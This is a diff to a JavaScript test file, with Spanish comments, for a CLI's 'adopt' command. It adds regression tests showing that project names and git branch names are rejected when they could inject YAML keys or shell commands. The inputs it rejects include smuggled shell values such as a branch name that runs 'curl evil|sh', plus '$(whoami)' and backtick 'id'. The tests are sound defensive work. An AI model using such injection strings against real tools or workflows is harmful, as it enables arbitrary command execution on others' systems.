@@ -15,6 +15,8 @@ import YAML from "yaml";
 import { commandAdopt, detectCliLinked } from "../src/adopt.js";
 import { validateConfigShape } from "../src/config-validator.js";
 
+const pathExistsSync = (candidate) => fs.existsSync(candidate);
+
 const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
 const cli = path.join(repoRoot, "bin", "sdlc.js");
 const PACKAGE_NAME = "sistema-multiagente-sdlc";
@@ -223,6 +225,58 @@ assert.ok(
 assert.ok(todasLasRutas.some((entry) => entry.startsWith("schemas/phase-evidence.schema.json")));
 
 console.log("adopt e2e (rama de integracion y rutas POSIX): PASS");
+
+// --- INYECCION POR LA PUERTA DE AL LADO -------------------------------------
+// El mismo agujero que se cerro en `commandUpgrade` seguia abierto aqui:
+// `--project-name` (o `package.json.name`) llegaba crudo hasta `interpolate()`,
+// que sustituye texto SIN escapar, y de ahi a quality-contract.yaml -- un
+// archivo que el guard de frontera SI protege, alcanzado desde una entrada que
+// nadie validaba. Reproducido antes del fix: el contrato salia con
+// `enforcement: block` inyectado como clave real y exit 0.
+const injectionTarget = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "sdlc-adopt-inject-")), "victima");
+fs.mkdirSync(injectionTarget, { recursive: true });
+fs.writeFileSync(path.join(injectionTarget, "package.json"), JSON.stringify({ name: "demo" }, null, 2), "utf8");
+
+const injected = commandAdopt({ target: injectionTarget, "project-name": "MiProyecto\nenforcement: block\n#" });
+assert.notEqual(injected.exitCode, 0, "un nombre con salto de linea no puede terminar en un contrato generado");
+assert.equal(injected.payload.code, "adopt-config-invalid");
+assert.ok(injected.payload.errors.some((e) => e.includes("/project/name")));
+assert.ok(
+  !pathExistsSync(path.join(injectionTarget, "quality-contract.yaml")),
+  "el rechazo tiene que ocurrir ANTES de generar nada, no despues"
+);
+assert.ok(!pathExistsSync(path.join(injectionTarget, ".sdlc", "config.json")));
+
+// Los campos que acaban dentro de una asignacion de shell en el workflow
+// (`BASE="origin/{{gitFlow.integrationBranch}}"`) no son texto libre: prohibir
+// solo CR/LF filtraba una carga util, no la causa. Una comilla basta.
+{
+  const base = {
+    schemaVersion: 1,
+    frameworkVersion: "1.8.0",
+    project: { name: "demo", slug: "demo" },
+    mode: "legacy",
+    surfaces: [],
+    openspec: { profile: "minimal" }
+  };
+  const legitimas = ["develop", "main", "release/1.2.x", "feature/algo-1"];
+  for (const branch of legitimas) {
+    assert.deepEqual(
+      validateConfigShape({ ...base, gitFlow: { integrationBranch: branch, stableBranch: "main" } }),
+      [],
+      `'${branch}' es un nombre de rama legitimo y no puede rechazarse`
+    );
+  }
+  const peligrosas = ['main";curl evil|sh;echo "', "rama con espacios", "a$(whoami)", "x`id`", "a;b"];
+  for (const branch of peligrosas) {
+    assert.ok(
+      validateConfigShape({ ...base, gitFlow: { integrationBranch: branch, stableBranch: "main" } }).length > 0,
+      `'${branch}' llega a una asignacion de shell del workflow generado: tiene que rechazarse`
+    );
+  }
+}
+
+console.log("adopt inyeccion por project-name y gitFlow: PASS");
 
 // --- E2E: aditivo puro -- correrlo de nuevo no pisa lo que ya existe -------
 fs.writeFileSync(
